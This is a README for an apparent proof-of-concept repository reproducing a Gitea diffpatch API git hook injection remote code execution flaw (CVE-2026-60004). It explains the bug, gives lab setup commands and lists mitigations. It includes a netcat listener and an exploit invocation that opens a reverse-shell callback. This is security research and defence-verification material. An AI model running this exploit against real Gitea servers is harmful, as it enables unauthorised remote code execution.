# Gitea diffpatch Git Hook Injection RCE (CVE-2026-60004)

> [!WARNING]
> **Disclaimer**: This repository is strictly created for academic research, education, and defense verification in an isolated laboratory environment. Unauthorized testing or exploitation of third-party systems is illegal.

## Overview

This repository contains the reproduction environment and verification scripts for **CVE-2026-60004** (CVSS 9.8), affecting Gitea `>= 1.17.0, < 1.27.1`.

The vulnerability resides in Gitea's `diffpatch` API (`POST /api/v1/repos/{owner}/{repo}/diffpatch`). When duplicate new-file patches are applied within a bare temporary clone, Git's 3-way merge (`-3`) resolution writes an executable hook directly into `$GIT_DIR/hooks/post-index-change`, resulting in remote code execution upon index update.

## Project Structure

```text
.
├── docker-compose.yml       # Vulnerable Gitea 1.27.0 deployment + baseline repo seed
├── test.sh                  # One-click automated verification script
├── REPORT.md                # Full academic report (Sections I ~ IV)
└── poc/
    ├── exploit.py           # Modular PoC verification script
    ├── matrix_test.py       # Controlled variable & architectural boundary tests
    ├── requirements.txt     # Python dependencies
    └── README.md            # Detailed reproduction & verification walkthrough
```

---

## Quick Start

### 1. Start the Environment
```bash
docker compose up -d
```
Gitea will be available at `http://localhost:3000` (with baseline test user `dev` and repository `dev/project` automatically initialized).

### 2. Run Automated Verification
```bash
./test.sh
```

### 3. Run Architectural Boundary Matrix
```bash
python3 poc/matrix_test.py --url http://localhost:3000
```

### 4. Interactive Callback Verification
Start a listener on the host:
```bash
nc -lvnp 4444
```
Query the Docker Compose bridge gateway IP and run the PoC with `--lhost`:
```bash
GATEWAY_IP="$(docker inspect -f '{{range .NetworkSettings.Networks}}{{.Gateway}}{{end}}' gitea-cve-2026-60004)"
python3 poc/exploit.py --url http://localhost:3000 --lhost "${GATEWAY_IP}" --lport 4444
```

---

## Mitigation & Remediation

1. **Upgrade**: Update Gitea to version `1.27.1` or later.
2. **Configuration Hardening**: If an immediate upgrade is not possible:
   - Disable public self-registration (`DISABLE_REGISTRATION = true` under `[service]` in `app.ini`) to prevent unauthenticated account provisioning.
   - Restrict or block `POST /api/v1/repos/*/*/diffpatch` at the reverse proxy until the instance is upgraded, as authenticated users with repository write permissions remain able to reach the vulnerable code path.
